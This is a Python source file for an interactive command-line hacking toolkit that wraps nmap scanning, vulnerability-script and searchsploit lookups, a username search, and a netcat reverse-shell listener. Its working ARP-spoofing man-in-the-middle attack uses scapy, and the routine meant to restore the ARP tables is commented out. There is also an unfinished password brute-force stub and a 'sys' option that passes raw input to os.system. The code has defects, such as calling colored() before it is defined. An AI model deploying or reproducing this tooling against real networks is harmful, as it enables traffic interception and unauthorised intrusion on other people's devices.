import nmap
import os
import socket as sc
from sys import platform
import sys
from bs4 import BeautifulSoup as bs
import requests as rq
import netifaces as ni
import argparse
import time
import scapy.all as scapy
from uuid import getnode as get_mac


if platform == "linux" or platform == "linux2":
    os.system("clear")
if platform == "win32":
    os.system("cls")

try:
    ni.ifaddresses('eth0')
    local_ip = str(ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'])
except ValueError:
    try:
        ni.ifaddresses('wlan0')
        local_ip = str(ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr'])
    except ValueError:
        try:
            ni.ifaddresses('wlan1')
            local_ip = str(ni.ifaddresses('wlan1')[ni.AF_INET][0]['addr'])
        except ValueError:
            try:
                print("here")
                ni.ifaddresses('enp4s0')
                local_ip = str(ni.ifaddresses('enp4s0')[ni.AF_INET][0]['addr'])
            except KeyError:
                try:
                    ni.ifaddresses('wlp3s0')
                    local_ip = str(ni.ifaddresses('wlp3s0')[ni.AF_INET][0]['addr'])
                except KeyError:
                    print("connexion", colored(255, 0, 0, "failed"))

def colored(r, g, b, text):
    return "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(r, g, b, text)

def help():
    print("\n")
    print("                 ", "in", colored(0, 0, 255, "terminal"))
    print("   -/    ", colored(0, 255, 0, commands[0]), "makes you exit.")
    print("   -/    ", colored(0, 255, 0, commands[3]), "clear the screen")
    print("   -/    ", colored(0, 255, 0, commands[2]), "prompt the help menu")
    print("   -/    ", colored(0, 255, 0, commands[8]), "show iformation obout your ip configuration depending on your os")
    print("   -/    ", colored(0, 255, 0, commands[9]), "let's you configure your iface (wifi or ethernet, here called wlan or eth)")
    print("   -/    ", colored(0, 255, 0, "{} <cmd>".format(commands[14])), "run a 'terminal' command")
    print("\n")
    print("                 ", "on", colored(0, 0, 255, "LAN"))
    print("   -/    ", colored(0, 255, 0, commands[1]), "show the alive devices on your local network")
    print("   -/    ", colored(0, 255, 0, commands[7]), "chack for all alive (or not) connexion on your local network")
    print("   -/    ", colored(0, 255, 0, commands[4]), "check open ports on the alive devices of your local network")
    print("   -/    ", colored(255, 0, 0, commands[5]), "attack a device with 'man in the middle' attack")
    print("\n")
    print("                 ", "on", colored(0, 0, 255, "the web"))
    print("   -/    ", colored(255, 0, 0, commands[6]), "looks for a username in various websites")
    print("   -/    ", colored(255, 0, 0, commands[10]), "crack a password using brutforce methode")
    print("\n")
    print("                 ", "on", colored(0, 0, 255, "the internet"))
    print("   -/    ", colored(0, 255, 0, commands[11]), "start listening in order to do a reverse shell")
    print("   -/    ", colored(0, 255, 0, commands[15]), "scan for open ports under 65535")
    print("   -/    ", colored(0, 255, 0, commands[13]), "scan the version of the target, and the version of the services of the target")
    print("   -/    ", colored(0, 255, 0, commands[16]), "scan and looks for known exploit for the running services")
    print("   -/    ", colored(0, 255, 0, commands[12]), "scan potential vulnerabilities on the target")


def conf():
    iface = str(input("what interface do you want to use? : "))

    if iface == "eth":
        try:
            ni.ifaddresses('eth0')
            local_ip = str(ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'])
        except ValueError:
            try:
                ni.ifaddresses('eth1')
                local_ip = str(ni.ifaddresses('eth1')[ni.AF_INET][0]['addr'])
            except ValueError:
                print("")
                print("     no ethernet connexion detected")

    if iface == "wlan":
        try:
            ni.ifaddresses('wlan0')
            local_ip = str(ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr'])
        except KeyError:
            try:
                ni.ifaddresses('wlan1')
                local_ip = str(ni.ifaddresses('wlan1')[ni.AF_INET][0]['addr'])
            except ValueError:
                print("")
                print("     no wifi connexion detected")
    if iface == "enp4s0":
        try:
            ni.ifaddresses('enp4s0')
            local_ip = str(ni.ifaddresses('enp4s0')[ni.AF_INET][0]['addr'])
        except ValueError:
            print("")
            print("     no ethernet connexion detected")
    try:
        print("you are now using", colored(0, 255, 0, local_ip))
    except UnboundLocalError:
        None
    if iface == "wlp3s0":
        try:
            ni.ifaddresses('wlp3s0')
            local_ip = str(ni.ifaddresses('wlp3s0')[ni.AF_INET][0]['addr'])
        except ValueError:
            print("")
            print("     no wifi connexion detected")
    try:
        print("you are now using", colored(0, 255, 0, local_ip))
    except UnboundLocalError:
        None


def scan():
    nm = nmap.PortScanner()
    myip = local_ip+"/24"
    scan = nm.scan(hosts= myip , arguments='-sn')
    for i in scan['scan']:
        brand = list(scan['scan'][i]['vendor'].values())
        name = scan['scan'][i]['hostnames'][0]['name']
        if len(brand) > 0:
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, brand[0]), "and called", colored(0, 255, 150, name), "is up")
        else:
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, "Unknown"), "and called", colored(0, 255, 150, name), "is up")

def scan_all():
    nm = nmap.PortScanner()
    myip = local_ip+"/24"
    scan_all = nm.scan(hosts= myip , arguments='-sn -Pn')
    for i in scan_all['scan']:
        brand = list(scan_all['scan'][i]['vendor'].values())
        name = scan_all['scan'][i]['hostnames'][0]['name']
        if len(brand) == 1 and (name != str() or type(name) == type([])):
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, brand[0]), "and called", colored(0, 255, 150, name), "is up")
        elif len(brand) == 0 and (name != str() or type(name) == type([])):
            print(colored(0, 255, 0, i), "made by", colored(0, 255, 150, "Unknown"), "and called", colored(0, 255, 150, name), "is up")


def scan_firewall():
    nm = nmap.PortScanner()
    myip = local_ip+"/24"
    scan1 = nm.scan(hosts= myip , arguments='-sn -Pn')
    print("scan", colored(0, 255, 0, "level 1"),  "/2")
    print("")
    for i in scan1['scan']:
        if scan1['scan'][i]['hostnames'][0]['name'] != str():
            print("     ", colored(255, 0, 0, i))
            print("")
            S1 = nm.scan(i, '20-450')
            try:
                for p in S1['scan'][i]['tcp']:
                    print("     port", colored(0, 255, 0, str(p)), "is open")
            except KeyError:
                print(colored(255, 0, 0, "  None. "))
            print("")
    print("scan", colored(0, 255, 0, "level 2"), "/2")
    print("")
    scan2 = nm.scan(hosts= myip , arguments='-sn')
    for i in scan2['scan']:
            print("     ", colored(255, 0, 0, i))
            print("")
            S2 = nm.scan(i, '20-450')
            try:
                for p in S2['scan'][i]['tcp']:
                    print("     port", colored(0, 255, 0, str(p)), "is open")
            except KeyError:
                print(colored(255, 0, 0, "  None. "))
            print("")

def mitm():
    print("")
    target_ip = str(input(colored(0, 255, 0, "     chose an IP address to attack : ")))
    target = target_ip + "/24"
    nm = nmap.PortScanner()
    scan = nm.scan(hosts= target , arguments='-sn -Pn')
    for i in scan['scan']:
        brand = list(scan['scan'][i]['vendor'].values())
        name = scan['scan'][i]['hostnames'][0]['name']
        if name == "lan.home":
            spoof_ip = i
    scan = nm.scan(hosts = target, arguments='-sn')
    for i in scan['scan']:
        if i == target_ip:
            destinationMac = scan['scan'][i]['addresses']['mac']
    for i in scan['scan']:
        if i == local_ip:
            print(local_ip)
    start(target_ip, spoof_ip, destinationMac)


def search():
    user = str(input("username :"))
    for i in url:
        code = rq.get(i + user).text
        soup = bs(code, 'lxml')
        title = soup.find_all('title')
        print(title)

def ip():
    print("")
    if platform == "linux" or platform == "linux2":
        os.system("ip addr")
    if platform == "win32":
        os.system("ipconfig")
    print("")
    print("you are currently known as", colored(0, 255, 0, local_ip))

def spoofer(targetIP, spoofIP, destinationMac):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
    scapy.send(packet, verbose=False)

def restore(destinationIP, sourceIP, destinationMac):
    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=destinationMac,psrc=sourceIP,hwsrc=sourceMAC)
    scapy.send(packet, count=4,verbose=False)

def start(targetIP, gatewayIP, destinationMac):
    packets = 0
    mitmattack = True
    try:
        while mitmattack:
            spoofer(targetIP,gatewayIP, destinationMac)
            spoofer(gatewayIP,targetIP, destinationMac)
            print("\r[+] Sent packets "+ str(packets))
            scapy.sniff(filter='arp and host %s or %s' %\
                        (gatewayIP, targetIP), count=1)
            sys.stdout.flush()
            packets +=2
            time.sleep(2)
    except KeyboardInterrupt:
        print(colored(0, 255, 0, "\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state.."))
        mitmattack = False
        #restore(targetIP,gatewayIP, destinationMac)
        #restore(gatewayIP,targetIP, destinationMac)

def psw_crack():
    url = str(input("Enter login page {} : ".format( colored(0, 255, 0, "URL"))))
    post = str(input("Enter the {} made : ".format( colored(0, 255, 0, "request"))))
    error_msg = str(input("Enter {} : ".format(colored(255, 0, 0, "Error message"))))
    #psw = pd.read_csv(rockyou.txt, encoding= 'unicode_escape')

    #with open("rockyou.txt", encoding = 'UTF-8') as psw:
        #P = psw.readlines()
        #print(P)
        #psw.close()

def vuln(ip):
    nm = nmap.PortScanner()
    scan = nm.scan(hosts= ip , arguments='--script vuln')
    print(scan)
    for i in scan['scan'][ip]['tcp']:
        print(scan['scan'][ip]['tcp'][i])

def vers(ip):
    nm = nmap.PortScanner()
    scan = nm.scan(hosts = ip, arguments = "-sV -A")
    for i in  scan['scan'][ip]['tcp']:
        print("")
        print("the port", colored(255, 0, 0, i), "for the service", colored(0, 255, 0, scan['scan'][ip]['tcp'][i]['name']), "by", colored(0, 0, 255, scan['scan'][ip]['tcp'][i]['product']), "is", colored(0, 255, 0, scan['scan'][ip]['tcp'][i]['state']), "and on version", colored(255, 0, 0, scan['scan'][ip]['tcp'][i]['version']))
    print("")
    print("")
    print("     the device run : ")
    print("")
    for i in scan['scan'][ip]['osmatch']:
        print("")
        print("     ", colored(255, 0, 0, i['name']), "(accuracy", colored(0, 255, 0, i['accuracy']), ")")

def ports(ip):
    nm = nmap.PortScanner()
    scan = nm.scan(hosts = ip, arguments = "-p-65535")
    for i in  scan['scan'][ip]['tcp']:
        print("")
        print("the port", colored(255, 0, 0, i), "is", colored(0, 255, 0, scan['scan'][ip]['tcp'][i]['state']))

def exploit(ip):
    V = []
    S = ['']
    nm = nmap.PortScanner()
    scan = nm.scan(hosts = ip, arguments = "-sV")
    print(colored(255, 0, 0, "http"), "will not be scanned")
    for i in scan['scan'][ip]['tcp']:
        V.append((scan['scan'][ip]['tcp'][i]['name'], scan['scan'][ip]['tcp'][i]['version']))
    print(V)
    for w in V:
        print("")
        if w[0] == 'http':
            pass
        else:
            scanned = False
            for u in S:
                if u == w[0]:
                    scanned = True
            if scanned == False:
                print("looking for exploit of", colored(0, 255, 0, "{} {}".format(w[0], w[1])))
                print("")
                os.system("searchsploit {}{}".format(w[0], w[1]))
                S.append(w[0])


def main():
    run = True
    while run:
        verif = False
        cmd = str(input(colored(255, 0, 0, "        -$  ")))

        for i in commands:
            if cmd == i:
                verif = True
        if verif == True:
            if cmd == "exit":
                if platform == "linux" or platform == "linux2":
                    os.system("clear")
                if platform == "win32":
                    os.system("cls")
                print(colored(0, 255, 0, "Goodbye."))
                run = False
            if cmd == "clear":
                if platform == "linux" or platform == "linux2":
                    os.system("clear")
                if platform == "win32":
                    os.system("cls")
            if cmd == "help":
                help()
            if cmd == "ip":
                ip()
            if cmd == "config":
                conf()

            if cmd == "scan local":
                scan()
            if  cmd == "scan local firewall":
                scan_firewall()
            if cmd == "scan local all":
                scan_all()
            if cmd == "mitm":
                mitm()
            if cmd == "search":
                search()
            if cmd == "password crack":
                psw_crack()
            if cmd == "reverse shell":
                port = str(input("choose a {}".format(colored(255, 0, 0, "port"))))
                os.system('nc -lnvp {}'.format(port))
            if cmd == "scan vuln":
                ip_target = str(input(" {} of the {} : ".format(colored(255, 0, 0, "ip"), colored(0, 255, 0, "target"))))
                vuln(ip_target)
            if cmd == "scan vers":
                ip_target = str(input(" {} of the {} : ".format(colored(255, 0, 0, "ip"), colored(0, 255, 0, "target"))))
                vers(ip_target)
            if cmd == "scan port":
                ip_target = str(input(" {} of the {} : ".format(colored(255, 0, 0, "ip"), colored(0, 255, 0, "target"))))
                ports(ip_target)
            if cmd == "scan exploit vers":
                ip_target = str(input(" {} of the {} : ".format(colored(255, 0, 0, "ip"), colored(0, 255, 0, "target"))))
                exploit(ip_target)


        else:
            if cmd.startswith("sys "):
                os.system(cmd.lstrip('sys '))
            else:
                print("\n")
                print(colored(255, 0, 0, "      '{}'".format(cmd)), colored(50, 50, 150, " is not a command, use help to see all the commands."))
                #os.system(cmd)
        print("\n")



print("\n")
print("@%(,.                   .,#                                        ")
print("                *@@@@@@@@@*@                                       ")
print("        @@@,                @*             &                       ")
print(" @@                          @@@@@@@@@@@,      *                   ")
print("                          (@@@&         .@@@@@*@   %               ")
print("                        (@@#                   @@@@@ ,             ")
print("                       %@@                          @@@@           ")
print("                       @@                            #@@@          ")
print("                        @@@                                        ")
print("                         @@@@.                                     ")
print("                            *@@@@@@@@@@@@@@@@#                     ")
print("                                             &@@@@@@@@@            ")
print("                                                   @@    %@@       ")
print("                                                      #@     .@    ")
print("                                                         @      @  ")
print("                                                           %      .")
print("                                                            @      ")
print("                                                             #     ")

print("\n")

print(colored(255, 0, 0, "      Hello"), colored(0, 255, 0, "{}".format(sc.gethostname())), colored(255, 0, 0, "I am nobody."))
print("\n")



url = ["https://www.twitter.com/", "https://www.instagram.com/"]

commands = ["exit", "scan local", "help", "clear", "scan local firewall", "mitm", "search", "scan local all", "ip", "config", "password crack", "reverse shell", "scan vuln", "scan vers", "sys", "scan port", "scan exploit vers"]

sourceMAC  = str(get_mac())

main()
